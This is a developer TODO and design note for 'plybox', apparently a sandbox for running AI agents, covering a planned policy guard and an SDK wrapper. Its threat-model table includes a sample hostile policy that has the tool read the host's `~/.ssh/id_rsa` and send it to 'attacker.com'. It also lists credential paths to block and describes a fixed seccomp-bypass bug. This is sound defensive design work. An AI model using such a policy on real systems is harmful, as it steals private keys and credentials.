# TODO

## Next: policy guard (after the TOML review)

The policy file is trusted input: several fields reach into the HOST, not
just the box. Fine when the machine owner writes every policy; a hole once
someone else can (a hosted service where users define their agents).

### Fields that touch the host — operator-only

| Field | What a hostile policy can do with it |
|---|---|
| `secrets.*.file` | **Worst.** `file = "~/.ssh/id_rsa", only = "attacker.com"` + `allow` it: plybox reads the host file and sends it to that host. The mode check passes (a private key is 0600). |
| `secrets` (env form, `NAME@HOST`) | sends the supervisor's own environment variable to a host of the policy's choosing |
| `fs.workspace` | a host path: `workspace = "/etc"` or `"~"` exposes it (as the overlay's lower layer) |
| `fs.ro_bind` | exposes any host path read-only, e.g. `~/.ssh` |
| `fs.rootfs` | `"host"` shows host `/usr`; a directory path shows that directory |
| `net.map` | resolves a name to any IP, skipping the public-address rule → internal network (test-only feature) |
| `net.trust_ca` | reads a host file (and makes the proxy trust it upstream) |
| `isolation`, `runsc` | downgrade gVisor → namespaces; point at another binary |
| `--learn`, `--session`, `--resume` | open the network; choose where state is written; reuse another session |

Safe for a user to set, with validation: the command, `image` (approved
list), `env` (non-secret values — they are saved in plain text), `net.allow`
(approved hosts only), `limits` (clamped to operator maximums).

### Work

Done on the way (found while building item 3, measured): a policy `ro_bind`
could replace `/plybox` — directly, or steered by a symlink in the image or
the workspace — and the box then ran with no seccomp filter or Landlock
(`Seccomp: 0`), in both tiers; a `..` destination made the gVisor tier
create directories anywhere on the host. Fixed: plybox's own mounts go on
top, destinations must be plain and may not cover `/plybox`/`/run/plybox`
(`make test-policy`, 6 checks, all failed on the old build).

1. **Refuse sensitive host paths by default** in `ro_bind`, `workspace`,
   `rootfs`, `trust_ca` and `secrets.*.file` — `~/.ssh`, `~/.aws`, `~/.gnupg`,
   `~/.config/gh`, `~/.claude`, `~/.config/plybox` (except the declared
   secret file itself, for `secrets.*.file`), plybox's own sessions/state
   dirs, `/etc/shadow`, … and any path that *contains* one of them (e.g. `~`,
   `/home`, `/`). Override only with an explicit `--allow-sensitive-path`.
2. ~~Print every host path the box can read, every secret file and every
   `map` at startup~~ — **done**: `src/exposure.rs`, printed unless
   `--quiet`, recorded as `exposure` in the start event (sessions check 1e).
3. ~~Operator ceilings~~ — **done**: `src/operator.rs`, read from
   `$PLYBOX_OPERATOR` or `/etc/plybox/operator.toml`; allowlists (paths,
   hosts, images, host-sourced secrets, sessions root), `[max]` limits
   (fill-in, refuse if unenforceable), forced tier; `map`/`trust_ca`/`--learn`
   refused. `docs/operator.md`; `make test-policy` (26 operator checks).
   Still open: tenant-from-tenant separation (one uid per tenant, or the
   service picks paths).
4. A hosting service without an operator file must still generate the full
   policy itself and never pass user input through as plybox flags.

## Later: SDK — run plybox from code

A thin wrapper around the CLI, not an embedded library: plybox must stay its
own process (it starts the box, runs the proxy, and holds secrets outside
the box), so a crash or bug in the caller must not reach the supervisor and
vice versa. About half a day for 1–2.

1. **Machine-readable CLI first** — `--json` on `run`, `diff`, `apply`,
   `sessions`, `discard`, `pull`, `images`: one JSON object per command with
   the session name, exit code, change list, record path and errors. Fixed,
   documented exit codes (box's own code vs plybox refused vs plybox failed).
2. **Python and Node packages** (~100 lines each) that build the arguments,
   run the binary, and parse the JSON:
   ```python
   r = plybox.run(["python", "agent.py"], image="python:3.13-slim",
                  allow=["api.anthropic.com"],
                  secrets={"ANTHROPIC_API_KEY": "api.anthropic.com"})
   print(r.exit_code, r.session); r.diff(); r.apply()
   ```
   Secrets go by environment or file, never as inline values in argv
   (visible in `ps`). Keep the wrapper policy-neutral: on a hosted service
   the operator's rules (see the policy guard above) still decide.
3. **Rust crate** later, only if someone wants to embed it; same rule —
   it spawns the binary rather than linking the supervisor in.
4. **`plybox cat SESSION PATH`** — print one file from the session's copy of
   the workspace (e.g. an agent's `result.json`) without knowing where
   sessions live or applying anything. Reads the box's work, so treat it as
   untrusted like `diff --patch` does: open with O_NOFOLLOW, refuse paths
   with `..` or leading `/`, refuse non-regular files, cap the size, and fall
   back to the workspace's own file when the box did not change it. SDK:
   `r.read("result.json")`.

How results reach the caller today (verified): the box's stdout/stderr pass
through `plybox` unchanged and `--quiet` keeps plybox's own messages off
stdout; `plybox` exits with the box's exit code; files the agent writes land
in `<session>/upper/` until `apply` (or directly in the folder with
`--workspace-mode bind`).

## Known, documented

- An idle proxy connection holds up to 16 KB of the `--bytes-in` budget
  while blocked in read; very small budgets can refuse new connections
  early. The cap itself is never exceeded. (Fix: wait for readability
  before reserving.)
